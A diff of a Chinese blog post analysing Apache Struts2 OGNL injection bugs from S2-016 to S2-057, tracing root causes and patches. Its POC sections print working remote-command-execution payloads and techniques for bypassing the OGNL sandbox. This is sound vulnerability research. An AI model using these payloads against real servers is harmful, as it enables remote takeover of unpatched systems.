 <h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:%&#123;#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h3><p><code>org.apache.struts2.dispatcher.mapper.DefaultActionMapper</code>默认的<code>redirect/redirectaction</code>直接被删除了</p>
-<p><img src="/assets/talk_about_struts2/image-20200515154730941.png" alt="image-20200515154730941"></p>
+<p><img src="image-20200515154730941.png" alt="image-20200515154730941"></p>
 <p><code>action:</code>部分因为S2-015的关系，限制了action名</p>
-<p><img src="/assets/talk_about_struts2/image-20200515154855569.png" alt="image-20200515154855569"></p>
+<p><img src="image-20200515154855569.png" alt="image-20200515154855569"></p>
 <p>已经不构成威胁了</p>
 <h2 id="11-S2-019"><a href="#11-S2-019" class="headerlink" title="11. S2-019"></a>11. S2-019</h2><p>范围：Struts 2.0.0 - Struts 2.3.15.1</p>
 <p>S2-019跟S2-008的第二个漏洞一样，当开启开发者模式时，允许使用command的模式来执行OGNL表达式</p>
@@ -493,20 +493,20 @@
 <h2 id="12-S2-029-S2-036"><a href="#12-S2-029-S2-036" class="headerlink" title="12. S2-029/S2-036"></a>12. S2-029/S2-036</h2><p>S2-029影响范围：Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)</p>
 <p>S2-036影响范围：Struts 2.0.0 - Struts 2.3.28.1 （跟S2-029一样，主要在修复的地方讲）</p>
 <p>原理跟S2-001差不多，S2-029的触发需要jsp用到标签<code>&lt;s:textfield name=&quot;%{xxxx}&quot;&gt;&lt;/s:textfield&gt;</code>，name属性中由一OGNL表达式解析而得，意味着生成的input标签的name属性是动态计算而得的，比如?xxxx=username，此时解析得到的input.name为username。这其中执行了<code>%{xxxx}</code>，获得xxxx的内容。而S2-001的修复主要解决的是递归计算OGNL表达式的问题，S2-029就是在进入translateVariables之前就将第一层的OGNL表达式执行完毕</p>
-<p><img src="/assets/talk_about_struts2/image-20200519143433067.png" alt="image-20200519143433067"></p>
+<p><img src="image-20200519143433067.png" alt="image-20200519143433067"></p>
 <p>直接看<code>UIBean.evaluateParams</code></p>
 <p>首先计算<code>%{message}</code>到我们传入的OGNL表达式</p>
-<p><img src="/assets/talk_about_struts2/image-20200519144431546.png" alt="image-20200519144431546"></p>
+<p><img src="image-20200519144431546.png" alt="image-20200519144431546"></p>
 <p>后续会在我们传入的OGNL表达式括上<code>%{xxx}</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200519144525695.png" alt="image-20200519144525695"></p>
-<p><img src="/assets/talk_about_struts2/image-20200519144603429.png" alt="image-20200519144603429"></p>
+<p><img src="image-20200519144525695.png" alt="image-20200519144525695"></p>
+<p><img src="image-20200519144603429.png" alt="image-20200519144603429"></p>
 <p>此时再传入到<code>findValue</code>就是第二层的OGNL表达式，后续跟S2-001一样，只需要执行一次OGNL表达式计算即可</p>
 <h3 id="POC-8"><a href="#POC-8" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 需要先初始化SecurityMemberAccess，不然无法执行</span></span><br><span class="line">?message=((%<span class="number">23</span>_memberAccess=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT</span>_MEMBER_ACCESS).(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open+/System/Applications/Calculator.app'</span>)))</span><br><span class="line"><span class="comment">// 回显POC</span></span><br><span class="line">?message=(%<span class="number">23</span>_memberAccess=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT</span>_MEMBER_ACCESS,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>)),%<span class="number">23</span>q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString</span>(%<span class="number">23</span>ret.getInputStream())</span><br><span class="line"> <span class="comment">// S2-036</span></span><br><span class="line"> ((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ret=@java.lang.Runtime@getRuntime().exec('id'))).(#q=@org.apache.commons.io.IOUtils@toString(#ret.getInputStream()))</span><br></pre></td></tr></table></figure>
 <h3 id="修复S2-029"><a href="#修复S2-029" class="headerlink" title="修复S2-029"></a>修复S2-029</h3><p><code>com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200519152941105.png" alt="image-20200519152941105"></p>
+<p><img src="image-20200519152941105.png" alt="image-20200519152941105"></p>
 <p>在计算表达式之前，验证是否可以执行</p>
-<p><img src="/assets/talk_about_struts2/image-20200519153530702.png" alt="image-20200519153530702"></p>
-<p><img src="/assets/talk_about_struts2/image-20200519153555655.png" alt="image-20200519153555655"></p>
+<p><img src="image-20200519153530702.png" alt="image-20200519153530702"></p>
+<p><img src="image-20200519153555655.png" alt="image-20200519153555655"></p>
 <p>这里先看<code>node.isEvalChain</code>，这里是对S2-009做的限制，也就是当出现<code>((1)(2))</code>时，会解析出<code>ASTEval</code>节点，而<code>ASTEval</code>对象的<code>isEvalChain</code>函数直接返回true，也就使得<code>(1)(2)</code>无法执行</p>
 <p>其次再来看<code>node.isSequence</code>，这里是对形如<code>(xxx1,xxx2,xxx3)</code>的OGNL表达式的限制，他将解析出<code>ASTSequence</code>节点，<code>ASTSequence</code>对象的<code>isSequence</code>直接返回true，也就限制了这种表达式的执行</p>
 <p>然后比较有意思的是，对于形如<code>((xxx1).(xxx2).(xxx3))</code>的OGNL表达式，这是一种<code>ASTChain</code>，但其中并不会解析出<code>ASTEval</code></p>
@@ -515,32 +515,32 @@
 <p>这里我的环境搭的是rest-showcase的，所以主要讲S2-033（S2-032的原理跟他差不多，只是触发变成了<code>method:#_xxxx</code>)</p>
 <p>rest-plugin支持解析<code>xxx!method</code>的调用</p>
 <p><code>org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocation</code>解析<code>name!method</code>，并对当前的<code>restactionmapper</code>设置好后续要调用method</p>
-<p><img src="/assets/talk_about_struts2/image-20200520223124404.png" alt="image-20200520223124404"></p>
+<p><img src="image-20200520223124404.png" alt="image-20200520223124404"></p>
 <p>在struts2的所有intercepter调用完毕后，会去调用DefaultActionInvocation的invokeActionOnly函数</p>
-<p><img src="/assets/talk_about_struts2/image-20200520223603177.png" alt="image-20200520223603177"></p>
+<p><img src="image-20200520223603177.png" alt="image-20200520223603177"></p>
 <p>而invokeActionOnly会去调用<code>com.opensymphony.xwork2.DefaultActionInvocation#invokeAction</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200520223738228.png" alt="image-20200520223738228"></p>
+<p><img src="image-20200520223738228.png" alt="image-20200520223738228"></p>
 <p>在这个函数里，我们可以看到他将前面可控的methodName放进了<code>ognlUtil.getValue</code>，导致了OGNL表达式的执行</p>
 <p>需要注意的是，在前面调用的interceptor里不能出现异常的情况，会导致无法执行到OGNL表达式执行的位置。这也就是为什么不能在开启<code>devMode</code>的情况下进行利用的原因。</p>
 <h3 id="POC-9"><a href="#POC-9" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// S2-037</span></span><br><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span></span><br></pre></td></tr></table></figure>
 <p>这里我们执行的命令用<code>#parameters.command[0]</code>的方式来获取，这是因为在生成<code>DefaultActionProxy</code>的时候对methodName做了转义处理，为了避免转义破坏OGNL表达式，用<code>#parameters</code>的方式从参数中获取。</p>
 <p>还有一个需要注意的地方是，在最后调用<code>ognlUtil.getValue</code>时，在methodName后面拼接了<code>()</code>，我们需要将这个<code>()</code>做处理，比如这里的POC做的处理是<code>#xx.toString</code>去吃掉这个<code>()</code></p>
-<h3 id="S2-032-S2-033修复"><a href="#S2-032-S2-033修复" class="headerlink" title="S2-032/S2-033修复"></a>S2-032/S2-033修复</h3><p><img src="/assets/talk_about_struts2/image-20200520230704180.png" alt="image-20200520230704180"></p>
+<h3 id="S2-032-S2-033修复"><a href="#S2-032-S2-033修复" class="headerlink" title="S2-032/S2-033修复"></a>S2-032/S2-033修复</h3><p><img src="image-20200520230704180.png" alt="image-20200520230704180"></p>
 <p><code>xwork-core:2.3.28.1</code>在<code>OgnlUtil.isEvalExpression</code>增加了<code>isSequence</code>的判断</p>
 <p>这里出现了新的一种利用方式<code>(1)?(2):(3)</code>，这种形式的OGNL表达式将有<code>ASTTest</code>对象来处理</p>
 <p>而<code>isEvalChain()</code>和<code>isSequence()</code>限制的是<code>ASTEval</code>和<code>ASTSequence</code>对象，这里并没有对ASTTest做限制，并且由于<code>isSequence</code>并不是递归去判断的，所以在<code>ASTTest</code>的children节点上再出现<code>ASTSequence</code>也是ok的</p>
 <p>根据这个原理，我们可以写出新的POC</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json</span><br></pre></td></tr></table></figure>
-<h3 id="S2-037修复"><a href="#S2-037修复" class="headerlink" title="S2-037修复"></a>S2-037修复</h3><p><img src="/assets/talk_about_struts2/image-20200520233839824.png" alt="image-20200520233839824"></p>
+<h3 id="S2-037修复"><a href="#S2-037修复" class="headerlink" title="S2-037修复"></a>S2-037修复</h3><p><img src="image-20200520233839824.png" alt="image-20200520233839824"></p>
 <p>在解析<code>name!method</code>的地方，调用了<code>cleanupActionName</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200520233957407.png" alt="image-20200520233957407"></p>
+<p><img src="image-20200520233957407.png" alt="image-20200520233957407"></p>
 <p>使用了正则，防止出现<code>(#@)</code>等特殊字符，出现就报错，也就到不了后续的OGNL表达式的执行</p>
 <p>并且在禁止的class列表里增加了两个</p>
-<p><img src="/assets/talk_about_struts2/image-20200520234647887.png" alt="image-20200520234647887"></p>
+<p><img src="image-20200520234647887.png" alt="image-20200520234647887"></p>
 <p>使得我们不能在用<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`来绕过限制</p>
 <h3 id="一个有意思的地方"><a href="#一个有意思的地方" class="headerlink" title="一个有意思的地方"></a>一个有意思的地方</h3><p>前面说到这3个漏洞需要开启DynamicMethodInvocation，其实不开启也是可以的</p>
 <p>前面说的几种方法都是在处理<code>name!method</code>这个格式，rest其实还支持对<code>action/id/method</code>的解析</p>
-<p><img src="/assets/talk_about_struts2/image-20200521112254951.png" alt="image-20200521112254951"></p>
+<p><img src="image-20200521112254951.png" alt="image-20200521112254951"></p>
 <p>所以改改POC就能通杀rest-plugin了</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig</span></span><br></pre></td></tr></table></figure>
 <h2 id="14-S2-045-S2-046"><a href="#14-S2-045-S2-046" class="headerlink" title="14. S2-045/S2-046"></a>14. S2-045/S2-046</h2><p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p>
@@ -548,22 +548,22 @@
 <p>这里2.3和2.5版本变化比较大，这里以2.3.31的代码分析，看2.5的可以看<a href="https://paper.seebug.org/247/" target="_blank" rel="noopener">https://paper.seebug.org/247/</a></p>
 <p>从struts2的工作流程图来看，所有的请求在生成ActionProxy之前，都由FilterDispatcher来处理，2.3版本用的是<code>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</code>，这里在调用action之前会先封装request。</p>
 <p>看看调用栈</p>
-<p><img src="/assets/talk_about_struts2/image-20200521154143972.png" alt="image-20200521154143972"></p>
+<p><img src="image-20200521154143972.png" alt="image-20200521154143972"></p>
 <p>封装实际由<code>org.apache.struts2.dispatcher.Dispatcher#wrapRequest</code>处理</p>
-<p><img src="/assets/talk_about_struts2/image-20200521154319856.png" alt="image-20200521154319856"></p>
+<p><img src="image-20200521154319856.png" alt="image-20200521154319856"></p>
 <p>可以看到这里在处理<code>Content-Type: multipart/form-data</code>类型时，会生成<code>org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper</code>处理，S2-045就是出问题在这里</p>
-<p><img src="/assets/talk_about_struts2/image-20200521154524558.png" alt="image-20200521154524558"></p>
+<p><img src="image-20200521154524558.png" alt="image-20200521154524558"></p>
 <p>在用<code>JakartaMultiPartRequest</code>解析request包时，调用<code>org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl</code>来检查Content-Type的内容，需要由multipart/开头才行，不然就是报错并将具体的contentType内容写到异常里</p>
-<p><img src="/assets/talk_about_struts2/image-20200521155036903.png" alt="image-20200521155036903"></p>
+<p><img src="image-20200521155036903.png" alt="image-20200521155036903"></p>
 <p>这里我们的可控数据就到了异常上，就看struts2是怎么处理异常了</p>
 <p><code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200521155309089.png" alt="image-20200521155309089"></p>
-<p><img src="/assets/talk_about_struts2/image-20200521155346720.png" alt="image-20200521155346720"></p>
+<p><img src="image-20200521155309089.png" alt="image-20200521155309089"></p>
+<p><img src="image-20200521155346720.png" alt="image-20200521155346720"></p>
 <p>可控内容传入了<code>com.opensymphony.xwork2.util.LocalizedTextUtil#findText</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200521155451100.png" alt="image-20200521155451100"></p>
-<p><img src="/assets/talk_about_struts2/image-20200521155901705.png" alt="image-20200521155901705"></p>
+<p><img src="image-20200521155451100.png" alt="image-20200521155451100"></p>
+<p><img src="image-20200521155901705.png" alt="image-20200521155901705"></p>
 <p>当前都没生成错误信息时，将获取默认的message</p>
-<p><img src="/assets/talk_about_struts2/image-20200521155825583.png" alt="image-20200521155825583"></p>
+<p><img src="image-20200521155825583.png" alt="image-20200521155825583"></p>
 <p>这里到了我们熟悉的<code>TextParseUtil.translateVariables</code>函数，他后续会处理计算OGNL表达式</p>
 <p>简单来说，整个过程从报错开始存入OGNL表达式，再生成错误信息的时候计算了OGNL表达式</p>
 <p>到了这里执行可控的OGNL表达式是第一步，因为2.3.29增加了对<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`的限制</p>
@@ -575,12 +575,12 @@
 <p>那么直接用<code>#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code>就可以覆盖原有的MemberAccess，但是因为<code>#context</code>本身就是被禁止的类，我们不能直接调用他。</p>
 <p>我们需要首先去除掉<code>ExcludedPackageNames</code>和<code>ExcludedClasses</code></p>
 <p>来看看他是怎么设置的<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200521172344561.png" alt="image-20200521172344561"></p>
+<p><img src="image-20200521172344561.png" alt="image-20200521172344561"></p>
 <p>可以看到<code>securityMemberAccess</code>的相关禁用设置都是来自于<code>ognlUtil</code>，这意味着我们只需要清除掉<code>ognlUtil</code>的禁用设置就可以消除掉<code>securityMemberAccess</code>的限制。这是因为在jvm里面他们用的都是同一个实例。</p>
 <p>所以上面的POC中用struts2的container的方式去获取ognlUtil实例，并将其禁用设置全部清除掉</p>
 <p>那么后面再用<code>#context.setMemberAccess</code>就没有阻碍了</p>
 <p>后续的代码就是执行并回显了，跟前面的类似</p>
-<h3 id="修复-9"><a href="#修复-9" class="headerlink" title="修复"></a>修复</h3><p><img src="/assets/talk_about_struts2/image-20200521204140738.png" alt="image-20200521204140738"></p>
+<h3 id="修复-9"><a href="#修复-9" class="headerlink" title="修复"></a>修复</h3><p><img src="image-20200521204140738.png" alt="image-20200521204140738"></p>
 <p>修复主要是不把message传入，放到了args的位置</p>
 <h2 id="15-S2-048"><a href="#15-S2-048" class="headerlink" title="15. S2-048"></a>15. S2-048</h2><p>这一部分不仔细说了，看<a href="https://www.freebuf.com/vuls/217482.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217482.html</a></p>
 <h2 id="16-S2-052"><a href="#16-S2-052" class="headerlink" title="16. S2-052"></a>16. S2-052</h2><p>影响范围:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p>
@@ -588,31 +588,31 @@
 <p>The REST Plugin is using a <code>XStreamHandler</code> with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.</p>
 </blockquote>
 <p>struts2的rest插件注册了ContentTypeInterceptor来处理不同的content-type</p>
-<p><img src="/assets/talk_about_struts2/image-20200522100814912.png" alt="image-20200522100814912"></p>
+<p><img src="image-20200522100814912.png" alt="image-20200522100814912"></p>
 <p>针对xml类型，将调用<code>XStreamHandler</code>来处理</p>
 <p><code>org.apache.struts2.rest.ContentTypeInterceptor#intercept</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200522101114659.png" alt="image-20200522101114659"></p>
+<p><img src="image-20200522101114659.png" alt="image-20200522101114659"></p>
 <p>根据request请求选择handler，这里我们传入<code>application/xml</code>类型，将使用<code>org.apache.struts2.rest.handler.XStreamHandler#toObject</code>来处理xml</p>
-<p><img src="/assets/talk_about_struts2/image-20200522101244620.png" alt="image-20200522101244620"></p>
+<p><img src="image-20200522101244620.png" alt="image-20200522101244620"></p>
 <p>这里用了最简单的调用方式（1.4.8版本），没有做xstream的相关安全处理，导致XStream反序列化</p>
 <p>所以我们传入构造好的XML就可以达到命令执行</p>
 <h3 id="POC-11"><a href="#POC-11" class="headerlink" title="POC"></a>POC</h3><p>这里的xml可以用我的ysomap去生成，把Content-Type设置成<code>application/xml</code>就可以了</p>
 <h3 id="修复-10"><a href="#修复-10" class="headerlink" title="修复"></a>修复</h3><p>S2-052跟以往的漏洞不一样，这里跟OGNL表达式并没有什么关系了，修复也比较简单</p>
 <p>升级XStream到了1.4.10版本，并且添加了安全措施</p>
-<p><img src="/assets/talk_about_struts2/image-20200522102217477.png" alt="image-20200522102217477"></p>
+<p><img src="image-20200522102217477.png" alt="image-20200522102217477"></p>
 <p>这里新添加了<code>AllowedClasses</code>、<code>AllowedClassNames</code>、<code>XStreamPermissionProvider</code>来设置每个类可以反序列化的对象列表</p>
 <p>也会添加一些默认的类</p>
-<p><img src="/assets/talk_about_struts2/image-20200522102927472.png" alt="image-20200522102927472"></p>
+<p><img src="image-20200522102927472.png" alt="image-20200522102927472"></p>
 <p>这里的用法就是XStream官方推荐的，采用白名单的方式来防止不安全的反序列化</p>
 <h2 id="17-S2-053"><a href="#17-S2-053" class="headerlink" title="17. S2-053"></a>17. S2-053</h2><p>影响版本:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1</p>
 <p>S2-053问题出在freemarker的标签内容可控时出现的问题</p>
-<p><img src="/assets/talk_about_struts2/image-20200522103937515.png" alt="image-20200522103937515"></p>
+<p><img src="image-20200522103937515.png" alt="image-20200522103937515"></p>
 <p>在action执行结束后，由于设置的类型为freemarker，所以结果交由freemarker来处理</p>
-<p><img src="/assets/talk_about_struts2/image-20200522111039529.png" alt="image-20200522111039529"></p>
+<p><img src="image-20200522111039529.png" alt="image-20200522111039529"></p>
 <p>关注对freemarker标签解析的类<code>org.apache.struts2.views.freemarker.tags.CallbackWriter#onStart</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200522111238176.png" alt="image-20200522111238176"></p>
+<p><img src="image-20200522111238176.png" alt="image-20200522111238176"></p>
 <p>因为这里我们时url标签，所以由<code>org.apache.struts2.components.URL#start</code>来处理</p>
-<p><img src="/assets/talk_about_struts2/image-20200522111315111.png" alt="image-20200522111315111"></p>
+<p><img src="image-20200522111315111.png" alt="image-20200522111315111"></p>
 <p>回到了由<code>ServletUrlRenderer</code>来解析我们传入的OGNL表达式，跟S2-013一样，后续也是由<code>TextParseUtil.translateVariables</code>触发的</p>
 <h3 id="POC-12"><a href="#POC-12" class="headerlink" title="POC"></a>POC</h3><p>poc可以直接用S2-045的poc</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line"><span class="comment">// 记得编码</span></span><br></pre></td></tr></table></figure>
@@ -640,16 +640,16 @@
 <p><a href="https://paper.seebug.org/682/" target="_blank" rel="noopener">https://paper.seebug.org/682/</a></p>
 </blockquote>
 <p>这里一种配置方案是</p>
-<p><img src="/assets/talk_about_struts2/image-20200522152919691.png" alt="image-20200522152919691"></p>
+<p><img src="image-20200522152919691.png" alt="image-20200522152919691"></p>
 <p>没有配置namespace，访问s2057.action都会导向test.action，这里处理redirectAction的是</p>
-<p><img src="/assets/talk_about_struts2/image-20200522153229727.png" alt="image-20200522153229727"></p>
+<p><img src="image-20200522153229727.png" alt="image-20200522153229727"></p>
 <p><code>org.apache.struts2.dispatcher.ServletActionRedirectResult#execute</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200522153556365.png" alt="image-20200522153556365"></p>
+<p><img src="image-20200522153556365.png" alt="image-20200522153556365"></p>
 <p><code>ServletActionRedirectResult</code>会将namespace一起拼接进location，比如<code>/s2vuls/${1*2}/s2057.action</code>,其namespace为<code>/${1*2}</code>,actionName为跳转的test，最终location为<code>/${1*2}/test.action</code>。到这里我们就引入了OGNL表达式，看后续的一个处理</p>
 <p><code>org.apache.struts2.dispatcher.StrutsResultSupport#execute</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200522154209594.png" alt="image-20200522154209594"></p>
+<p><img src="image-20200522154209594.png" alt="image-20200522154209594"></p>
 <p>到这里，就开始熟悉起来了，就是S2-012的漏洞触发点</p>
-<p><img src="/assets/talk_about_struts2/image-20200522154315511.png" alt="image-20200522154315511"></p>
+<p><img src="image-20200522154315511.png" alt="image-20200522154315511"></p>
 <p>传入了<code>TextParseUtil.translateVariables</code>，到这里就结束了，后续将调用OGNL.getValue</p>
 <h3 id="POC-13"><a href="#POC-13" class="headerlink" title="POC"></a>POC</h3><p>在2.3.x版本，可以直接用S2-045的poc打</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action</span><br></pre></td></tr></table></figure>
